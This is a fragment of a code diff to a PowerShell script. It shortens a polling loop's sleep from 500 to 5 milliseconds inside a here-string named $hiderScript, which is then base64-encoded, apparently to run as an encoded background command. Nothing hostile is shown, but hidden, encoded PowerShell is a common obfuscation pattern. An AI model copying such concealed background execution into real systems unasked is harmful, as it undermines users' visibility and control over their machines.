@@ -48,7 +48,7 @@ while ($true) {
         }
     }
 
-    Start-Sleep -Milliseconds 500  # small delay to reduce CPU usage
+    Start-Sleep -Milliseconds 5
 }
 '@
             $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($hiderScript))
